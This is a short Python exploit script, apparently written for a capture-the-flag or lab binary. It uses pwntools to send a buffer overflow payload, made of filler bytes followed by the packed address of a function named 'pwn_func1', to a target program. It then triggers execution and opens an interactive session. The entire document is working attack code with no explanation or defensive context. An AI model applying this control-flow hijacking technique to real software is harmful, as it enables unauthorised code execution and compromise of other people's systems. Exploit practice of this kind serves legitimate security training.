#!/usr/bin/env python3
import sys
import pwn

exe = sys.argv[1]
elf = pwn.ELF(exe)
pwnfunc1 = elf.symbols['pwn_func1']

payload = (b'prints '
            + (b'\xff' * 540)
            + (b'\0' * 4)
            + (b'\0' * 8)
            + pwn.p64(pwnfunc1)
          )
with open("/dev/null") as err:
  io = pwn.process(exe,stderr=err)
  io.sendline(payload)
  io.recvuntil(b'Enter command: ')
  io.send(b'exec\n')
  out1 = io.recvuntil(b'\n')
  out2 = io.recvuntil((b'Enter command: ', b'\n'))
io.interactive()
